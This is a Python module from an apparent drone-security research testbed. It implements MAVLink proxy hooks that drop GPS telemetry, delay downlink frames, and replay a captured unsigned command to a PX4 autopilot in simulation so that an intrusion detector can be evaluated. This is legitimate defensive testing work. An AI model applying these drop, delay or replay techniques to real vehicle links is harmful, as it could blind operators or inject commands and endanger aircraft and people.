"""Three more live P2 proxy attacks -- ``docs/ATTACK_PROXY.md`` order items 3-5
(drop, delay, replay), additive to ``attacks_live.py``. Same conventions as that module
(``FrameHook``-conforming, pure, stateful-but-socket-free callables; no sockets, no
threads, no PX4/Gazebo ground truth; never subclasses or imports ``attacks/base.py``).
Kept in a separate module purely to keep file size manageable -- there is no behavioural
reason these could not live in ``attacks_live.py``; constants shared with that module
(message ids, the MAVLink2 magic byte, the PX4-autopilot heartbeat check, the default
warmup) are re-declared here rather than imported, so this module has no dependency on
``attacks_live.py`` internals and neither module needs to change if the other does.

1. :class:`DropAttack` -- downlink ``GLOBAL_POSITION_INT`` / ``GPS_RAW_INT`` suppression
   for a window. **Injection point**: downlink telemetry, PX4 -> IDS/GCS. **Claim class**:
   link-level detection only (SITL) -- PX4 itself is the sender and is unaffected; this is
   a denial of a telemetry *channel to the observer*, not a vehicle-side effect. Expected
   detector signature (hypothesis, not a result): the protocol detector's GPS-dropout /
   heartbeat-timeout style check (``configs/detector.yaml`` ``require_signing``-adjacent
   timing checks), mapping most naturally to a DOS-style attack type in Stage-1 vocabulary
   -- not asserted here, left for ``aegis-validation``.
2. :class:`DelayAttack` -- holds every downlink frame for a fixed per-trial delay during a
   window, releasing held frames (byte-identical, in original FIFO order) once their
   individual release time has passed or the window ends (whichever comes first, per
   frame). **Injection point**: downlink telemetry. **Claim class**: link-level detection
   only, and only as a *hypothesis* -- ``docs/ATTACK_PROXY.md`` §2 already flags
   delay/jitter as sitting close to the benign WSL/Gazebo jitter noise floor (P1: jitter
   p95 ~= 4.9 ms, max 36 ms), so a negative (not detected) result is an expected, reportable
   outcome, not a failure of this attack.
3. :class:`ReplayAttack` -- captures one legitimate, unsigned uplink ``COMMAND_LONG`` from
   a specific client identity and command id, then re-sends the byte-identical captured
   frame (same sysid/compid/seq -- nothing is re-packed) a drawn delay later, piggybacked
   on a later real uplink frame. **Injection point**: uplink, attacker (this hook,
   replaying a frame it never authored) -> PX4. **Claim class ceiling**: command-path
   effect (SITL) *only if* PX4 acks the replay -- never a detection claim. This is the
   documented ``command_injection:gcs_replay`` known gap (``docs/ATTACKS.md``): on an
   unsigned link (``require_signing: false``), a replayed frame from the *real* GCS
   identity is wire-identical to a fresh one, so **no** detector signal is expected from
   the protocol detector's identity/provenance checks -- that absence is the P4
   before/after baseline this attack exists to measure, not an incidental negative result.
"""

from __future__ import annotations

from collections import deque
from collections.abc import Callable, Mapping
from dataclasses import dataclass
from datetime import UTC, datetime
from typing import Any

import numpy as np
from pymavlink.dialects.v20 import common as mav2

from .groundtruth import FrameLogEntry, FrameLogWriter
from .hooks import FrameContext

GLOBAL_POSITION_INT_ID = 33
GPS_RAW_INT_ID = 24
HEARTBEAT_ID = 0
COMMAND_LONG_ID = 76
COMMAND_ACK_ID = 77
_V2_MAGIC = 0xFD
_MAV_AUTOPILOT_PX4 = mav2.MAV_AUTOPILOT_PX4

#: Same 10 s defensive floor as ``attacks_live.DEFAULT_WARMUP_S`` -- re-declared (not
#: imported) per the module docstring's "no cross-dependency" rationale; value must stay
#: identical if either changes, there being no behavioural reason it should not.
DEFAULT_WARMUP_S = 10.0


# --------------------------------------------------------------------------- #
# 1. DropAttack -- downlink GPS-channel suppression
# --------------------------------------------------------------------------- #

#: Disclosed up front (mechanism transparency, docs/ATTACK_PROXY.md §6 convention); only
#: the per-trial *draws* for holdout seeds are withheld.
DROP_RANGES: Mapping[str, tuple[float, float]] = {
    "onset_s": (35.0, 45.0),
    "duration_s": (6.0, 12.0),
}

#: msgids suppressed by :class:`DropAttack` -- GLOBAL_POSITION_INT (fused GPS fix) and
#: GPS_RAW_INT (raw GPS), the two channels the protocol detector's GPS-dropout check reads.
DROP_TARGET_MSGIDS: frozenset[int] = frozenset({GLOBAL_POSITION_INT_ID, GPS_RAW_INT_ID})


@dataclass(frozen=True)
class DropParams:
    """One trial's drawn parameters for :class:`DropAttack`."""

    trial_seed: int
    trial_index: int
    onset_s: float
    duration_s: float


def draw_drop_params(
    seed: int,
    trial_index: int = 0,
    ranges: Mapping[str, tuple[float, float]] = DROP_RANGES,
) -> DropParams:
    """Draw one trial's drop-window parameters deterministically.

    Same convention as ``attacks_live.draw_params``: ``trial_seed = seed + trial_index``
    feeds a fresh ``numpy.random.default_rng``; draws happen in a fixed order (onset,
    duration) so two calls with the same ``(seed, trial_index, ranges)`` are
    byte-identical.
    """
    trial_seed = seed + trial_index
    rng = np.random.default_rng(trial_seed)
    onset_s = float(rng.uniform(*ranges["onset_s"]))
    duration_s = float(rng.uniform(*ranges["duration_s"]))
    return DropParams(trial_seed=trial_seed, trial_index=trial_index, onset_s=onset_s, duration_s=duration_s)


class DropAttack:
    """``FrameHook`` suppressing ``GLOBAL_POSITION_INT``/``GPS_RAW_INT`` downlink frames
    from the target vehicle for one ``[onset_s, onset_s + duration_s)`` window.

    Same fail-closed target-learning convention as ``attacks_live.PositionDriftAttack``:
    if ``target_sysid``/``target_compid`` are both ``None`` (default), learned passively
    from the first unsigned MAVLink2 ``HEARTBEAT`` whose ``autopilot`` field is
    ``MAV_AUTOPILOT_PX4`` (12); until learned, every frame passes through untouched. A
    matching frame that is itself signed is never dropped (fail closed, cannot verify a
    signature it would then be suppressing) -- it passes through and is counted in
    ``frames_skipped_signed``, logged as ``"forwarded"``. Every other frame (wrong
    source, wrong msgid, outside the window) passes through byte-identical and
    unlogged. Never raises.
    """

    def __init__(
        self,
        params: DropParams,
        *,
        target_sysid: int | None = None,
        target_compid: int | None = None,
        warmup_s: float = DEFAULT_WARMUP_S,
        frame_log: FrameLogWriter | None = None,
        now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
    ) -> None:
        if (target_sysid is None) != (target_compid is None):
            raise ValueError("target_sysid and target_compid must both be set or both be None")
        self.params = params
        self._target_sysid = target_sysid
        self._target_compid = target_compid
        self._warmup_s = warmup_s
        self._frame_log = frame_log
        self._now_utc = now_utc
        self._decoder = mav2.MAVLink(None)
        self._first_vehicle_recv_ns: int | None = None

        self.frames_seen = 0
        self.frames_modified = 0
        self.frames_dropped = 0
        self.frames_injected = 0
        self.frames_skipped_signed = 0

    def __call__(self, ctx: FrameContext) -> list[bytes]:
        self.frames_seen += 1
        if ctx.direction != "down":
            return [ctx.raw]

        self._maybe_learn_target(ctx)
        if self._target_sysid is None:
            return [ctx.raw]

        is_target = ctx.sysid == self._target_sysid and ctx.compid == self._target_compid
        if is_target and self._first_vehicle_recv_ns is None:
            self._first_vehicle_recv_ns = ctx.recv_ns

        if not is_target or ctx.msgid not in DROP_TARGET_MSGIDS:
            return [ctx.raw]

        elapsed_s = (ctx.recv_ns - self._first_vehicle_recv_ns) / 1e9
        onset, duration = self.params.onset_s, self.params.duration_s
        if not (elapsed_s >= max(self._warmup_s, onset) and elapsed_s < onset + duration):
            return [ctx.raw]

        if ctx.signed:
            self.frames_skipped_signed += 1
            self._log(ctx, action="forwarded", field_deltas={}, modified_len=len(ctx.raw))
            return [ctx.raw]

        self.frames_dropped += 1
        self._log(ctx, action="dropped", field_deltas={}, modified_len=0)
        return []

    def _maybe_learn_target(self, ctx: FrameContext) -> None:
        if self._target_sysid is not None:
            return
        if ctx.direction != "down" or ctx.msgid != HEARTBEAT_ID or ctx.signed:
            return
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return
        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
        except Exception:
            return
        if msg.get_type() != "HEARTBEAT":
            return
        if getattr(msg, "autopilot", None) == _MAV_AUTOPILOT_PX4:
            self._target_sysid = ctx.sysid
            self._target_compid = ctx.compid

    def _log(self, ctx: FrameContext, *, action: str, field_deltas: dict[str, int], modified_len: int) -> None:
        if self._frame_log is None:
            return
        self._frame_log.append(FrameLogEntry(
            seq_no=self.frames_seen,
            proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
            recv_ns=ctx.recv_ns, msgid=ctx.msgid, sysid=ctx.sysid, compid=ctx.compid,
            mavlink_seq=ctx.seq, action=action, field_deltas=field_deltas, crc_recomputed=False,
            original_len=len(ctx.raw), modified_len=modified_len,
        ))


# --------------------------------------------------------------------------- #
# 2. DelayAttack -- downlink hold-and-release
# --------------------------------------------------------------------------- #

#: ``onset_s`` is this attack's own choice (not specified by the task beyond "a window"):
#: reuses the same [20, 60] s convention already used for ``attacks_live.RANGES``/
#: ``COMMAND_INJECTION_RANGES`` onsets, for no reason beyond consistency with the rest of
#: this proxy's trials -- flagged here as a disclosed assumption, not inferred from any
#: spec text. ``duration_s`` and ``delay_s`` are exactly the task's stated ranges.
DELAY_RANGES: Mapping[str, tuple[float, float]] = {
    "onset_s": (20.0, 60.0),
    "duration_s": (6.0, 12.0),
    "delay_s": (0.3, 1.5),
}


@dataclass(frozen=True)
class DelayParams:
    """One trial's drawn parameters for :class:`DelayAttack`."""

    trial_seed: int
    trial_index: int
    onset_s: float
    duration_s: float
    delay_s: float


def draw_delay_params(
    seed: int,
    trial_index: int = 0,
    ranges: Mapping[str, tuple[float, float]] = DELAY_RANGES,
) -> DelayParams:
    """Draw one trial's delay-window parameters deterministically (see :func:`draw_drop_params`)."""
    trial_seed = seed + trial_index
    rng = np.random.default_rng(trial_seed)
    onset_s = float(rng.uniform(*ranges["onset_s"]))
    duration_s = float(rng.uniform(*ranges["duration_s"]))
    delay_s = float(rng.uniform(*ranges["delay_s"]))
    return DelayParams(trial_seed=trial_seed, trial_index=trial_index, onset_s=onset_s,
                        duration_s=duration_s, delay_s=delay_s)


class DelayAttack:
    """``FrameHook`` holding every unsigned downlink frame for a fixed per-trial delay
    ``delay_s`` while inside ``[onset_s, onset_s + duration_s)`` (measured from the first
    downlink frame this hook ever observes, any source -- this attack targets the link,
    not one vehicle identity, per its "ALL downlink frames" design).

    Mechanism (the hook cannot emit on a timer -- only when a real frame arrives, per
    ``proxy/hooks.py``):

    * every call first releases any held frame whose ``release_ns = original_recv_ns +
      delay_s`` has passed, in FIFO order (oldest first) -- this is what makes
      "frame-driven" delivery work without a background thread;
    * if the *current* frame falls inside the window and is unsigned, it is appended to
      the hold queue (not forwarded this call) and logged ``"delayed"`` with its original
      and release times;
    * the instant the window is observed to have just ended (this call's frame is the
      first *outside* the window after a call where it was still active), every
      remaining held frame is flushed immediately, in order, ahead of the current
      (live) frame -- so a held frame is never stranded waiting for its natural release
      time if the window itself has already closed;
    * a signed frame is never held (cannot verify/doesn't need to break a signature this
      attack never decodes, but the fail-closed convention used throughout this proxy is
      kept for consistency) -- it passes through immediately, counted in
      ``frames_skipped_signed``; this can reorder it ahead of older still-held frames,
      which is disclosed, not hidden (no signed frames exist on this link today,
      ``signed=0`` for 100% of P1 captures, so this is not expected to matter in current
      SITL trials).

    Guarantee (asserted in tests): every frame ever held is forwarded **exactly once**,
    byte-identical, and in the same relative order it was held in. No frame is ever
    forwarded twice or dropped. Known limitation: if the window ends on the very last
    downlink frame of a capture, any still-held frames are stranded until a further call
    arrives -- there being no next frame, they are never flushed. This is an inherent
    consequence of the hook's frame-driven (non-timer) design and is not fixed here.
    """

    def __init__(
        self,
        params: DelayParams,
        *,
        warmup_s: float = DEFAULT_WARMUP_S,
        frame_log: FrameLogWriter | None = None,
        now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
    ) -> None:
        self.params = params
        self._warmup_s = warmup_s
        self._frame_log = frame_log
        self._now_utc = now_utc
        self._first_down_recv_ns: int | None = None
        self._held: deque[tuple[int, bytes, int, int, int]] = deque()  # (release_ns, raw, msgid, sysid, compid)...
        self._window_active_prev = False

        self.frames_seen = 0
        self.frames_modified = 0
        self.frames_dropped = 0
        self.frames_injected = 0
        self.frames_delayed = 0
        self.frames_skipped_signed = 0

    def __call__(self, ctx: FrameContext) -> list[bytes]:
        self.frames_seen += 1
        if ctx.direction != "down":
            return [ctx.raw]

        if self._first_down_recv_ns is None:
            self._first_down_recv_ns = ctx.recv_ns

        out: list[bytes] = list(self._release_due(ctx.recv_ns))

        elapsed_s = (ctx.recv_ns - self._first_down_recv_ns) / 1e9
        onset, duration = self.params.onset_s, self.params.duration_s
        in_window = elapsed_s >= max(self._warmup_s, onset) and elapsed_s < onset + duration

        if self._window_active_prev and not in_window:
            out.extend(self._flush_all())
        self._window_active_prev = in_window

        if in_window and not ctx.signed:
            release_ns = ctx.recv_ns + round(self.params.delay_s * 1e9)
            self._held.append((release_ns, ctx.raw, ctx.msgid, ctx.sysid, ctx.compid, ctx.seq, ctx.recv_ns))
            self.frames_delayed += 1
            self._log(ctx, release_ns=release_ns)
        else:
            if in_window and ctx.signed:
                self.frames_skipped_signed += 1
            out.append(ctx.raw)

        return out

    def _release_due(self, now_ns: int) -> list[bytes]:
        released: list[bytes] = []
        while self._held and self._held[0][0] <= now_ns:
            _, raw, *_ = self._held.popleft()
            released.append(raw)
        return released

    def _flush_all(self) -> list[bytes]:
        released = [raw for _, raw, *_ in self._held]
        self._held.clear()
        return released

    def _log(self, ctx: FrameContext, *, release_ns: int) -> None:
        if self._frame_log is None:
            return
        self._frame_log.append(FrameLogEntry(
            seq_no=self.frames_seen,
            proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
            recv_ns=ctx.recv_ns, msgid=ctx.msgid, sysid=ctx.sysid, compid=ctx.compid,
            mavlink_seq=ctx.seq, action="delayed",
            field_deltas={"original_recv_ns": ctx.recv_ns, "release_ns": release_ns,
                          "delay_ns": release_ns - ctx.recv_ns},
            crc_recomputed=False, original_len=len(ctx.raw), modified_len=len(ctx.raw),
        ))


# --------------------------------------------------------------------------- #
# 3. ReplayAttack -- uplink COMMAND_LONG replay (the gcs_replay known gap, live)
# --------------------------------------------------------------------------- #

#: Explicit per the task: the legitimate command captured (and later replayed
#: byte-identical) is an unsigned uplink ``COMMAND_LONG`` from sysid 252 / compid 193
#: (the "carrier" client identity ``scripts/sitl/run_p2_injection_trial.py`` already uses)
#: carrying ``MAV_CMD_SET_MESSAGE_INTERVAL`` (511) -- a harmless, side-effect-light command
#: chosen so that a real PX4 acceptance/rejection is unambiguous via its ``COMMAND_ACK``
#: without needing an arm/disarm-style safety discussion.
DEFAULT_CAPTURE_SYSID = 252
DEFAULT_CAPTURE_COMPID = 193
DEFAULT_CAPTURE_COMMAND = mav2.MAV_CMD_SET_MESSAGE_INTERVAL  # 511

#: Disclosed up front; only the per-trial draw is withheld for holdout seeds.
REPLAY_RANGES: Mapping[str, tuple[float, float]] = {
    "replay_delay_s": (15.0, 30.0),
}


@dataclass(frozen=True)
class ReplayParams:
    """One trial's drawn parameters for :class:`ReplayAttack`."""

    trial_seed: int
    trial_index: int
    replay_delay_s: float


def draw_replay_params(
    seed: int,
    trial_index: int = 0,
    ranges: Mapping[str, tuple[float, float]] = REPLAY_RANGES,
) -> ReplayParams:
    """Draw one trial's replay-delay parameter deterministically (see :func:`draw_drop_params`)."""
    trial_seed = seed + trial_index
    rng = np.random.default_rng(trial_seed)
    replay_delay_s = float(rng.uniform(*ranges["replay_delay_s"]))
    return ReplayParams(trial_seed=trial_seed, trial_index=trial_index, replay_delay_s=replay_delay_s)


class ReplayAttack:
    """``FrameHook`` demonstrating the documented ``command_injection:gcs_replay`` known
    gap live: captures the first unsigned uplink ``COMMAND_LONG`` matching
    ``(capture_sysid, capture_compid, capture_command)``, then re-sends the exact same
    captured bytes (same sysid/compid/seq -- nothing is decoded, modified, or re-packed;
    this is a pure byte replay, not an impersonation like ``CommandInjectionAttack``)
    once ``replay_delay_s`` has elapsed, piggybacked on the next real unsigned uplink
    frame it sees (the same "append, never replace" trick as ``CommandInjectionAttack``:
    returns ``[ctx.raw, captured_raw]``).

    **Injection point**: uplink, this hook replaying previously-observed traffic ->
    PX4. **Claim class ceiling**: command-path effect (SITL) -- and only that, only if the
    downlink shows a matching ``COMMAND_ACK`` after the replay; this attack makes **no**
    detection claim. Under ``require_signing: false`` the replayed frame is byte-identical
    to the original legitimate command (down to sysid/compid/seq), so the protocol
    detector's identity/provenance checks have **nothing** to distinguish -- no detector
    signal is *expected*, which is the point: this is the "before" half of the P4
    signing before/after measurement, not an incidental negative result.

    Capture and replay are each one-shot per instance: only the *first* matching
    ``COMMAND_LONG`` is ever captured, and it is replayed at most once. A signed candidate
    frame is never captured (fail closed); a signed carrier frame is never used to
    piggyback the replay (fail closed, same convention as ``CommandInjectionAttack``) --
    both counted in ``frames_skipped_signed``. Downlink ``COMMAND_ACK`` frames matching
    ``capture_command`` by command id are observed (never modified) both before and after
    the replay fires, letting :func:`aegisflight.proxy.groundtruth.compute_replay_effect`
    report the ack to the *original* command and the ack to the *replay* separately --
    the same "matched by command id alone, no request-id in the protocol" limitation as
    ``CommandInjectionAttack._maybe_observe_ack`` (disclosed there and here, not fixed).
    Never raises.
    """

    def __init__(
        self,
        params: ReplayParams,
        *,
        capture_sysid: int = DEFAULT_CAPTURE_SYSID,
        capture_compid: int = DEFAULT_CAPTURE_COMPID,
        capture_command: int = DEFAULT_CAPTURE_COMMAND,
        frame_log: FrameLogWriter | None = None,
        now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
    ) -> None:
        self.params = params
        self._capture_sysid = capture_sysid
        self._capture_compid = capture_compid
        self._capture_command = capture_command
        self._frame_log = frame_log
        self._now_utc = now_utc
        self._decoder = mav2.MAVLink(None)

        self._captured_raw: bytes | None = None
        self._captured_recv_ns: int | None = None
        self._captured_seq: int | None = None
        self._replayed = False

        self.frames_seen = 0
        self.frames_modified = 0
        self.frames_dropped = 0
        self.frames_injected = 0
        self.frames_replayed = 0
        self.frames_skipped_signed = 0

    def __call__(self, ctx: FrameContext) -> list[bytes]:
        self.frames_seen += 1
        if ctx.direction == "down":
            self._maybe_observe_ack(ctx)
            return [ctx.raw]  # this attack never modifies downlink traffic

        # uplink: the real frame is always forwarded unchanged; we only ever append.
        if self._captured_raw is None:
            self._maybe_capture(ctx)
            return [ctx.raw]

        if self._replayed:
            return [ctx.raw]

        elapsed_since_capture_s = (ctx.recv_ns - self._captured_recv_ns) / 1e9
        if elapsed_since_capture_s < self.params.replay_delay_s:
            return [ctx.raw]

        if ctx.signed:
            self.frames_skipped_signed += 1
            return [ctx.raw]

        self._replayed = True
        self.frames_replayed += 1
        self._log_replayed(ctx.recv_ns)
        return [ctx.raw, self._captured_raw]

    # -- internals ------------------------------------------------------------ #

    def _maybe_capture(self, ctx: FrameContext) -> None:
        if ctx.sysid != self._capture_sysid or ctx.compid != self._capture_compid:
            return
        if ctx.msgid != COMMAND_LONG_ID:
            return
        if ctx.signed:
            self.frames_skipped_signed += 1
            return
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return  # MAVLink 1 (or malformed): not our recognised wire format for capture
        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
        except Exception:
            return
        if msg.get_type() != "COMMAND_LONG" or int(msg.command) != self._capture_command:
            return

        self._captured_raw = ctx.raw
        self._captured_recv_ns = ctx.recv_ns
        self._captured_seq = ctx.seq
        self._log(
            action="captured", recv_ns=ctx.recv_ns, msgid=ctx.msgid, sysid=ctx.sysid, compid=ctx.compid,
            mavlink_seq=ctx.seq, field_deltas={"command": int(msg.command)}, crc_recomputed=False,
            original_len=len(ctx.raw), modified_len=len(ctx.raw),
        )

    def _maybe_observe_ack(self, ctx: FrameContext) -> None:
        if self._captured_raw is None:
            return  # nothing captured yet to match an ack against
        if ctx.msgid != COMMAND_ACK_ID or ctx.signed:
            return
        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
            return
        try:
            msg = self._decoder.decode(bytearray(ctx.raw))
        except Exception:
            return
        if msg.get_type() != "COMMAND_ACK":
            return
        if int(msg.command) != self._capture_command:
            return  # known limitation (see class docstring): matched by command id only
        self._log(
            action="observed_ack", recv_ns=ctx.recv_ns, msgid=ctx.msgid, sysid=ctx.sysid, compid=ctx.compid,
            mavlink_seq=ctx.seq, field_deltas={"result": int(msg.result), "command": int(msg.command)},
            crc_recomputed=False, original_len=len(ctx.raw), modified_len=len(ctx.raw),
        )

    def _log_replayed(self, replay_recv_ns: int) -> None:
        if self._frame_log is None:
            return
        self._frame_log.append(FrameLogEntry(
            seq_no=self.frames_seen,
            proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
            recv_ns=replay_recv_ns, msgid=COMMAND_LONG_ID, sysid=self._capture_sysid,
            compid=self._capture_compid, mavlink_seq=self._captured_seq, action="replayed",
            field_deltas={"captured_recv_ns": self._captured_recv_ns, "command": self._capture_command,
                          "delay_ns": replay_recv_ns - self._captured_recv_ns},
            crc_recomputed=False, original_len=len(self._captured_raw), modified_len=len(self._captured_raw),
        ))

    def _log(self, **kwargs: Any) -> None:
        if self._frame_log is None:
            return
        self._frame_log.append(FrameLogEntry(
            seq_no=self.frames_seen, proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
            **kwargs,
        ))
